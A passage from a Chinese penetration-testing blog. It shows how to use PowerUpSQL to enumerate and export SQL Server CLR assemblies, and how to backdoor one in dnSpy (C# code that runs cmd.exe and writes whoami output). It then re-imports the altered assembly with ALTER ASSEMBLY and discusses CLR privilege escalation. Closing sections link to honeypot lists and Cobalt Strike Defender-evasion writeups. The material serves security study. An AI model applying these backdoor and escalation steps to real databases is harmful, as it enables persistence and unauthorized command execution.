<p>我做了一个PowerUpSQL函数来调用“Create-SQLFileCLRDll”创建类似的DLL和TSQL脚本。 它还支持设置自定义的程序集名称，类名称，方法名称和存储过程名称。 如果没有指定设置，那么它们都是随机的。 以下是一个基本的命令示例：</p>
<pre><code class="prism language-c">PS C<span class="token punctuation">:</span>temp<span class="token operator">&gt;</span> Create<span class="token operator">-</span>SQLFileCLRDll <span class="token operator">-</span>ProcedureName <span class="token string">"runcmd"</span> <span class="token operator">-</span>OutFile runcmd <span class="token operator">-</span>OutDir c<span class="token punctuation">:</span>temp
C# File<span class="token punctuation">:</span> c<span class="token punctuation">:</span>tempruncmd<span class="token punctuation">.</span>csc
CLR DLL<span class="token punctuation">:</span> c<span class="token punctuation">:</span>tempruncmd<span class="token punctuation">.</span>dll
SQL Cmd<span class="token punctuation">:</span> c<span class="token punctuation">:</span>tempruncmd<span class="token punctuation">.</span>txt
</code></pre>
<p>以下是生成10个CLR DLL / CREATE ASSEMBLY SQL脚本的示例，在实验室中使用CLR组件时，可以派上用场。</p>
<pre><code class="prism language-c"><span class="token number">1.</span><span class="token number">.10</span><span class="token operator">|</span> <span class="token operator">%</span><span class="token punctuation">{</span> Create<span class="token operator">-</span>SQLFileCLRDll <span class="token operator">-</span>Verbose <span class="token operator">-</span>ProcedureName myfile$_ <span class="token operator">-</span>OutDir c<span class="token punctuation">:</span>temp <span class="token operator">-</span>OutFile myfile$_ <span class="token punctuation">}</span>
</code></pre>
<p><strong>如何列出现有的CLR程序集和CLR存储过程？</strong></p>
<p>你可以使用下面的TSQL语句来查询验证你的CLR程序集是否正确设置，或者寻找现有的用户自定义的CLR程序集。</p>
<pre><code class="prism language-c">USE msdb<span class="token punctuation">;</span>
SELECT      <span class="token function">SCHEMA_NAME</span><span class="token punctuation">(</span>so<span class="token punctuation">.</span><span class="token punctuation">[</span>schema_id<span class="token punctuation">]</span><span class="token punctuation">)</span> AS <span class="token punctuation">[</span>schema_name<span class="token punctuation">]</span><span class="token punctuation">,</span> 
                        af<span class="token punctuation">.</span>file_id<span class="token punctuation">,</span>                                             
                        af<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">'.dll'</span> as <span class="token punctuation">[</span>file_name<span class="token punctuation">]</span><span class="token punctuation">,</span>
                        asmbly<span class="token punctuation">.</span>clr_name<span class="token punctuation">,</span>
                        asmbly<span class="token punctuation">.</span>assembly_id<span class="token punctuation">,</span>           
                        asmbly<span class="token punctuation">.</span>name AS <span class="token punctuation">[</span>assembly_name<span class="token punctuation">]</span><span class="token punctuation">,</span> 
                        am<span class="token punctuation">.</span>assembly_class<span class="token punctuation">,</span>
                        am<span class="token punctuation">.</span>assembly_method<span class="token punctuation">,</span>
                        so<span class="token punctuation">.</span>object_id as <span class="token punctuation">[</span>sp_object_id<span class="token punctuation">]</span><span class="token punctuation">,</span>
                        so<span class="token punctuation">.</span>name AS <span class="token punctuation">[</span>sp_name<span class="token punctuation">]</span><span class="token punctuation">,</span>
                        so<span class="token punctuation">.</span><span class="token punctuation">[</span>type<span class="token punctuation">]</span> as <span class="token punctuation">[</span>sp_type<span class="token punctuation">]</span><span class="token punctuation">,</span>
                        asmbly<span class="token punctuation">.</span>permission_set_desc<span class="token punctuation">,</span>
                        asmbly<span class="token punctuation">.</span>create_date<span class="token punctuation">,</span>
                        asmbly<span class="token punctuation">.</span>modify_date<span class="token punctuation">,</span>
                        af<span class="token punctuation">.</span>content                                                                         
FROM        sys<span class="token punctuation">.</span>assembly_modules am
INNER JOIN  sys<span class="token punctuation">.</span>assemblies asmbly
ON          asmbly<span class="token punctuation">.</span>assembly_id <span class="token operator">=</span> am<span class="token punctuation">.</span>assembly_id
INNER JOIN  sys<span class="token punctuation">.</span>assembly_files af 
ON          asmbly<span class="token punctuation">.</span>assembly_id <span class="token operator">=</span> af<span class="token punctuation">.</span>assembly_id 
INNER JOIN  sys<span class="token punctuation">.</span>objects so
ON          so<span class="token punctuation">.</span><span class="token punctuation">[</span>object_id<span class="token punctuation">]</span> <span class="token operator">=</span> am<span class="token punctuation">.</span><span class="token punctuation">[</span>object_id<span class="token punctuation">]</span>
</code></pre>
<p>使用这个查询我们可以看到文件名、程序集名、程序集类名、程序集方法和方法映射到的存储过程。</p>
<p><img src="https://img-blog.csdnimg.cn/20201012221248169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
如果你运行了我之前提供的“Create-SQLFileCLRDll”命令生成的10个TSQL查询，那么你应该在你的查询结果中看到“my_assembly”，你还将看到这些程序集相关的程序集信息。</p>
<p><strong>PowerUpSQL自动化</strong></p>
<p>我在PowerUpSQL中添加了一个名为“Get-SQLStoredProcedureCLR”的功能，它将迭代可访问的数据库，并提供每个数据库的程序集信息。 以下是一个命令示例：</p>
<pre><code class="prism language-c">Get<span class="token operator">-</span>SQLStoredProcedureCLR <span class="token operator">-</span>Verbose <span class="token operator">-</span>Instance MSSQLSRV04SQLSERVER2014 <span class="token operator">-</span>Username sa <span class="token operator">-</span>Password <span class="token string">'sapassword!'</span> <span class="token operator">|</span> Out<span class="token operator">-</span>GridView
</code></pre>
<p>你还可以使用以下命令对所有域内的SQL Server执行此操作（前提是你拥有正确的权限）。</p>
<pre><code class="prism language-c">Get<span class="token operator">-</span>SQLInstanceDomain <span class="token operator">-</span>Verbose <span class="token operator">|</span> Get<span class="token operator">-</span>SQLStoredProcedureCLR <span class="token operator">-</span>Verbose <span class="token operator">-</span>Instance MSSQLSRV04SQLSERVER2014 <span class="token operator">-</span>Username sa <span class="token operator">-</span>Password <span class="token string">'sapassword!'</span> <span class="token operator">|</span> Format<span class="token operator">-</span>Table <span class="token operator">-</span>AutoSize
</code></pre>
<p><strong>映射程序参数</strong></p>
<p>攻击者不是唯一创建不安全程序集的人员。有时候开发人员会创建执行OS命令或者与操作系统进行资源交互的程序集。因此，定位和逆向这些程序集也是很有必要的，有时这些程序集会有权限提升的bug。例如，如果我们的程序集已经存在，我们可以尝试去确定一下它接受的参数和怎么使用它们。只是为了好玩，让我们使用下面的TSQL查询“cmd_exec”存储过程接受了哪些参数</p>
<pre><code class="prism language-c">SELECT                       pr<span class="token punctuation">.</span>name as procname<span class="token punctuation">,</span>
                                                pa<span class="token punctuation">.</span>name as param_name<span class="token punctuation">,</span> 
                                                <span class="token function">TYPE_NAME</span><span class="token punctuation">(</span>system_type_id<span class="token punctuation">)</span> as Type<span class="token punctuation">,</span>
                                                pa<span class="token punctuation">.</span>max_length<span class="token punctuation">,</span> 
                                                pa<span class="token punctuation">.</span>has_default_value<span class="token punctuation">,</span>
                                                pa<span class="token punctuation">.</span>is_nullable 
FROM                    sys<span class="token punctuation">.</span>all_parameters paINNER JOIN              sys<span class="token punctuation">.</span>procedures pr on pa<span class="token punctuation">.</span>object_id <span class="token operator">=</span> pr<span class="token punctuation">.</span>object_idWHERE                   pr<span class="token punctuation">.</span>type like <span class="token string">'pc'</span> and pr<span class="token punctuation">.</span>name like <span class="token string">'cmd_exec'</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020101222133652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
在这个例子中，我们可以看到它只接受一个名为“execCommand”的字符串参数。 针对存储过程的攻击者可能能够确定它可以用于执行OS命令。</p>
<p><strong>如何将SQL Server中存在的CLR程序集导出到DLL？</strong></p>
<p>在SqlServer中，我们还可以将用户定义的CLR程序集导出到dll。我们来谈谈从识别CLR程序集到获取CLR的源代码。首先，我们必须识别程序集，然后将它们导出到dll，并且对它们进行反编译以便进行源码分析（或修改为注入后门程序）。</p>
<p><strong>PowerUpSQL自动化</strong></p>
<p>在上面我们讨论了如何使用下面的PowerUpSQL命令列出CLR程序集。</p>
<pre><code class="prism language-c">Get<span class="token operator">-</span>SQLStoredProcedureCLR <span class="token operator">-</span>Verbose <span class="token operator">-</span>Instance MSSQLSRV04SQLSERVER2014 <span class="token operator">-</span>Username sa <span class="token operator">-</span>Password <span class="token string">'sapassword!'</span> <span class="token operator">|</span> Format<span class="token operator">-</span>Table <span class="token operator">-</span>AutoSize
</code></pre>
<p>它存在一个“ExportFolder”选项，我们可以设置它，这个功能将会把程序集dll导出到文件夹，以下是一个命令示例：</p>
<pre><code class="prism language-c">Get<span class="token operator">-</span>SQLStoredProcedureCLR <span class="token operator">-</span>Verbose <span class="token operator">-</span>Instance MSSQLSRV04SQLSERVER2014 <span class="token operator">-</span>ExportFolder c<span class="token punctuation">:</span>temp  <span class="token operator">-</span>Username sa <span class="token operator">-</span>Password <span class="token string">'sapassword!'</span> <span class="token operator">|</span> Format<span class="token operator">-</span>Table <span class="token operator">-</span>AutoSize
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201012221405897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
如果你是域用户，并且权限是sysadmin，还可以使用下面的命令导出CLR DLL</p>
<pre><code class="prism language-c">Get<span class="token operator">-</span>SQLInstanceDomain <span class="token operator">-</span>Verbose <span class="token operator">|</span> Get<span class="token operator">-</span>SQLStoredProcedureCLR <span class="token operator">-</span>Verbose <span class="token operator">-</span>Instance MSSQLSRV04SQLSERVER2014 <span class="token operator">-</span>Username sa <span class="token operator">-</span>Password <span class="token string">'sapassword!'</span> <span class="token operator">-</span>ExportFolder c<span class="token punctuation">:</span>temp <span class="token operator">|</span> Format<span class="token operator">-</span>Table <span class="token operator">-</span>AutoSize
</code></pre>
<p>Dll可以在输出的文件夹中找到。脚本将基于每个服务器的名称、实例和数据库的名称动态构建文件夹结构<img src="https://img-blog.csdnimg.cn/20201012221425257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>然后你可以使用你喜欢的反编译器查看源代码。在过去一年中，我已经成为dnSpy的粉丝。阅读后面的内容你将知道这是因为什么</p>
<p><strong>如何修改CLR DLL并覆盖已经导入SQL Server的程序集？</strong></p>
<p>以下简要介绍如何使用dnSpy反编译、查看、编辑、保存、和重新导入现有的SQL Server CLR DLL,你可以在这里<a href="https://github.com/0xd4d/dnSpy/releases">下载dnSpy</a>。</p>
<p>本次练习我们将修改从SQL Server导出的cmd_exec.dll</p>
<p>1.在dnSpy中打开cmd_exec.dll文件。在左侧面板中，向下选择，直到找到“cmd_exec”方法并选择它，你可以立马看到它的源码并寻找bug。<br>
<img src="https://img-blog.csdnimg.cn/20201012221518149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
2.接下来，右键单击包含源代码的右侧面板，然后选择“Edit Method (C#) …”</p>
<p><img src="https://img-blog.csdnimg.cn/20201012221528334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
3.编辑你想编辑的代码，在这个例子中，我添加了一个简单的“后门”，每次调用“cmd_exec”方法时，都会向“C:temp”目录中添加文件。示例代码和屏幕截图如下。</p>
<pre><code class="prism language-c">public <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">cmd_exec</span><span class="token punctuation">(</span>SqlString execCommand<span class="token punctuation">)</span><span class="token punctuation">{</span>
    Process expr_05 <span class="token operator">=</span> new <span class="token function">Process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    expr_05<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>FileName <span class="token operator">=</span> <span class="token string">"C:\Windows\System32\cmd.exe"</span><span class="token punctuation">;</span>
    expr_05<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>Arguments <span class="token operator">=</span> string<span class="token punctuation">.</span><span class="token function">Format</span><span class="token punctuation">(</span><span class="token string">" /C {0}"</span><span class="token punctuation">,</span> execCommand<span class="token punctuation">.</span>Value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    expr_05<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>UseShellExecute <span class="token operator">=</span> true<span class="token punctuation">;</span>
    expr_05<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    expr_05<span class="token punctuation">.</span><span class="token function">WaitForExit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    expr_05<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    Process expr_54 <span class="token operator">=</span> new <span class="token function">Process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    expr_54<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>FileName <span class="token operator">=</span> <span class="token string">"C:\Windows\System32\cmd.exe"</span><span class="token punctuation">;</span>
    expr_54<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>Arguments <span class="token operator">=</span> string<span class="token punctuation">.</span><span class="token function">Format</span><span class="token punctuation">(</span><span class="token string">" /C 'whoami &gt; c:\temp\clr_backdoor.txt"</span><span class="token punctuation">,</span> execCommand<span class="token punctuation">.</span>Value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    expr_54<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>UseShellExecute <span class="token operator">=</span> true<span class="token punctuation">;</span>
    expr_54<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    expr_54<span class="token punctuation">.</span><span class="token function">WaitForExit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    expr_54<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201012221544651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
4.通过单击编译按钮保存修补的代码。然后从顶部菜单选择File、Save Module….然后点击确定<br>
<img src="https://img-blog.csdnimg.cn/20201012221554570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
根据这篇<a href="https://docs.microsoft.com/en-us/dotnet/api/system.reflection.module.moduleversionid?redirectedfrom=MSDN&amp;view=netcore-3.1#System_Reflection_Module_ModuleVersionId">Microsoft</a>的文章，在每次编译CLR时，都会生成一个唯一的GUID并将其嵌入到文件头中，以便用来区分同一文件的两个版本。这被称为MVID（模块版本ID）。要覆盖已经导入到SQLServer的现有CLR，我们必须手动修改MVID。以下是一个概述。</p>
<p>1.在dnSpy中打开“cmd_exec”,如果它还没有被打开，向下选择PE部分并选择“#GUID”存储流。然后右键单击它，然后选择“Show Data in Hex Editor”。</p>
<p><img src="https://img-blog.csdnimg.cn/20201012221651826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
2.接下来，我们需要用任意值修改所选字节之一</p>
<p><img src="https://img-blog.csdnimg.cn/20201012221706663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
3.从顶部菜单中选择文件，然后选择“Save Module…”</p>
<p><img src="https://img-blog.csdnimg.cn/20201012221716929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
PowerShell自动化</p>
<p>你可以使用我之前提供的原始PowerShell命令，也可以使用下面的PowerUPSQL命令从新修改的“cmd_exec.dll”文件获取十六进制字节，并生成ALTER语句。</p>
<pre><code class="prism language-c">PS C<span class="token punctuation">:</span>temp<span class="token operator">&gt;</span> Create<span class="token operator">-</span>SQLFileCLRDll <span class="token operator">-</span>Verbose <span class="token operator">-</span>SourceDllPath <span class="token punctuation">.</span>cmd_exec<span class="token punctuation">.</span>dll
VERBOSE<span class="token punctuation">:</span> Target C#  File<span class="token punctuation">:</span> NA
VERBOSE<span class="token punctuation">:</span> Target DLL File<span class="token punctuation">:</span> <span class="token punctuation">.</span>cmd_exec<span class="token punctuation">.</span>dll
VERBOSE<span class="token punctuation">:</span> Grabbing bytes from the dll
VERBOSE<span class="token punctuation">:</span> Writing SQL to<span class="token punctuation">:</span> C<span class="token punctuation">:</span>UsersSSUTHE<span class="token operator">~</span><span class="token number">1</span>AppDataLocalTempCLRFile<span class="token punctuation">.</span>txt
C# File<span class="token punctuation">:</span> NA
CLR DLL<span class="token punctuation">:</span> <span class="token punctuation">.</span>cmd_exec<span class="token punctuation">.</span>dll
SQL Cmd<span class="token punctuation">:</span> C<span class="token punctuation">:</span>UsersSSUTHE<span class="token operator">~</span><span class="token number">1</span>AppDataLocalTempCLRFile<span class="token punctuation">.</span>txt
</code></pre>
<p>新的cmd_exec.txt 内容看起来应该像下面的语句</p>
<pre><code class="prism language-c"><span class="token operator">--</span> Choose the msdb database
use msdb
<span class="token operator">--</span> Alter the existing CLR assembly
ALTER ASSEMBLY <span class="token punctuation">[</span>my_assembly<span class="token punctuation">]</span> FROM 
<span class="token number">0x4D5A90000300000004000000F</span><span class="token punctuation">[</span>TRUNCATED<span class="token punctuation">]</span>
WITH PERMISSION_SET <span class="token operator">=</span> UNSAFE 
GO
</code></pre>
<p>ALTER语句用于替换现有的CLR而不是DROP和CREATE。 正如微软所说的那样：“ALTER ASSEMBLY不会中断正在修改的程序集中当前会话里正在运行的代码。当前会话通过使用程序集的未更改位来完成执行。 所以，总而言之，什么都没有发生。 TSQL查询执行应该看起来像下面的截图:<br>
<img src="https://img-blog.csdnimg.cn/20201012221750346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
要检查代码修改是否有效，请运行“cmd_exec”存储过程，并验证是否已创建“C:tempbackdoor.txt”文件。</p>
<p><strong>我可以使用自定义CLR升级SQL Server中的权限吗？</strong></p>
<p>答案是肯定的，但有一些苛刻的条件必须要满足。</p>
<p>如果你的SQL Server不是以sysadmin登录的，但具有CREATE或ALTER ASSEMBLY权限，则可以使用自定义CLR获取sysadmin权限，该自定义CLR将在SQL Server服务帐户（由sysadmin默认）。但是，要成功创建CLR程序集的数据库，必须将’is_trustworthy’标志设置为’1’并启用’clr enabled’服务器设置。默认情况下，只有msdb数据库是可靠的，并且禁用“clr enabled”设置。</p>
<p>我从来没有看到明确分配给SQL登录的CREATE或ALTER ASSEMBLY权限。但是，我已经看到应用程序SQL登录添加到“db_ddladmin”数据库角色，并且具有“ALTER ASSEMBLY”权限。</p>
<p>注意：SQL Server 2017引入了“clr strict security”配置。 Microsoft文档规定，需要禁用该设置以允许创建UNSAFE或EXTERNAL程序集。</p>
<hr>
<h2><a id="1316__5135"></a>13.16 蜜罐之家分享</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>paralax<span class="token operator">/</span>awesome<span class="token operator">-</span>honeypots
</code></pre>
<p>拿走吧，感谢大佬…</p>
<p>书上分享了honeypot-camera蜜罐和AMTHoneypot-CVE-2017-5689蜜罐，都包含在里面了…</p>
<hr>
<h2><a id="1317_Cobalt_StrikeWindowsDefender_5145"></a>13.17 Cobalt Strike使用混淆绕过WindowsDefender</h2>
<p>原文：http://www.offensiveops.io/tools/cobalt-strike-bypassing-windows-defender-with-obfuscation/</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>anquanke<span class="token punctuation">.</span>com<span class="token operator">/</span>post<span class="token operator">/</span>id<span class="token operator">/</span><span class="token number">101308</span>   <span class="token operator">--</span>Cobalt Strike：使用混淆技术绕过Windows Defender
</code></pre>
<p>学习！！</p>
<hr>
<h2><a id="1318__5155"></a>13.18 渗透实战从打点到域控的全过程</h2>
<p>内部书籍写得很详细，这里不写出来了…</p>
<h2><a id="1319_Docker_5159"></a>13.19 Docker极速入门</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>changkun<span class="token punctuation">.</span>gitbook<span class="token punctuation">.</span>io<span class="token operator">/</span>docker<span class="token operator">/</span>  <span class="token operator">--</span>拿走！
</code></pre>
<hr>
<h2><a id="1320__5166"></a>13.20 记一次应急响应样本分析</h2>
<p>内部书籍写得很详细，这里不写出来了…</p>
<hr>
<h1><a id="_5171"></a>持续添加更新中…直到写不动为止！</h1>

    </div>
  </div>
</body>

</html>
